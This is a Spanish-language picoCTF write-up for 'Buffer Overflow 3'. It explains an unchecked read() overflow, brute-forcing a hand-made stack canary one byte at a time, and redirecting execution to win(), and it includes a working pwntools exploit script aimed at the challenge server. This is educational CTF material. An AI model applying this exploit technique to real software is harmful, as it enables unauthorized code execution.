# Buffer Overflow 3

Este ejercicio nos ofrece un binario y su código en C.

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

El binario nos pide que haya un `canary.txt` creado en el directorio actual de trabajo así que la creamos:

```bash
echo -n 'D3b0' > canary.txt
```

Una vez creado el programa funciona de la siguiente manera:

1. Nos pide establecer un tamaño para un buffer
2. Nos pide introducir un valor al buffer

```c
./vuln
How Many Bytes will You Write Into the Buffer?
> 10
Input> hola
Ok... Now Where's the Flag?
```

Si miramos el código podemos ver el buffer overflow:

```c
read(0, buf, count);
```

Esta línea **lee hasta `count` bytes desde la entrada y los escribe en el buffer `buf`**, sin verificar si `count` es mayor que el tamaño del buffer (`64` bytes), lo que permite un buffer overflow.

```c
sscanf(length,"%d",&count);
```

Entonces, si mandamos como tamaño 100 estaremos escribiendo en la variable `buf` mas que el máximo de 64 bytes que estaba establecido anteriormente.

Ahora que podemos hacer un buffer overflow nuestro objetivo es llegar a la dirección de retorno y mandar el flujo de nuestro programa a la función `win()`. El binario tiene canary hecho manualmente, por eso no aparece en el `checksec`. Si miramos el código podemos ver que hay un chequeo manual con `memcpm` para detectar si hemos sobrescrito el canary:

```c
if (memcmp(canary,global_canary,CANARY_SIZE)) {
    printf("***** Stack Smashing Detected ***** : Canary ValueCorrupt!\n"); // crash immediately
    fflush(stdout);
    exit(0);
}
printf("Ok... Now Where's the Flag?\n");
fflush(stdout);
```

> Como tal el binario no tiene canary, ya que en el `checksec` hems visto que pone que no hay pero el programador que ha hecho el binario ha puesto un “canary manual“.

Si intentamos bruteforcear el canary y clavar los 4 bytes de una tendríamos un problema ya que solo 1 de cada 4.2 mil millones de intentos serían exitosos. Hay una variante a esto que es encontrar el offset al canary y ir bruteforceando de byte en byte y ver si el programa crashea o en este caso si nos salta el mensaje: `***** Stack Smashing Detected ***** : Canary Value Corrupt!`. Esto solo nos llevaría en el peor de los casos 1024 intentos y de promedio 512.

Entonces vamos a ver que tenemos que hacer:

1. Mandar un tamaño para el buffer mayor o igual que nuestro payload final
2. Mandar a `buf` los bytes necesarios hasta llegar al canary
3. Bruteforcear byte a byte el canary
4. Ver la distancia entre el canary y el `EIP` y llenar ese hueco con mas bytes
5. Mandar la dirección de la función win

```c
GRÁFICO

payloadFinal = b'A' * offset_hasta_canary + valor_canary + b'A' * offset_hasta_eip + direccion_win
```

Ahora podemos hacer el script que haga todo esto:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("saturn.picoctf.net", 63053)

def main():
    offset = 64
    canary = b''
    chars = string.printable

    for i in range(4):  # Bruteforce de los 4 primeros bytes del canary
        for guess in chars:
            try:
                io = conn()
                payload = b'A' * offset + canary + guess.encode()
                io.sendlineafter(b'> ', str(len(payload)).encode())
                io.sendlineafter(b'> ', payload)
                response = io.recvline(timeout=1)

                if b'Smashing' not in response:
                    canary += p8(ord(guess))
                    info(f"[{i+1}/4] Byte encontrado: {hex(ord(guess))} -> Canary parcial: {canary}")
                    io.close()
                    break
                io.close()
            except Exception as e:
                print(f"[{i+1}/4] EXCEPCIÓN: {e}")
                try:
                    io.close()
                except:
                    pass

    print(f"\n[+] Canary completo encontrado: {canary}")
    payload += b'A' * 16
    payload += p32(exe.symbols.win)
    info(f'Payload: {payload}')
    
    io = conn()
    io.sendlineafter(b'> ', str(len(payload)).encode())
    io.sendlineafter(b'Input> ', payload)
    io.interactive()
if __name__ == "__main__":
    main()

```

Tenemos la flag!

```c
Ok... Now Where's the Flag?
picoCTF{SECRETO}
```
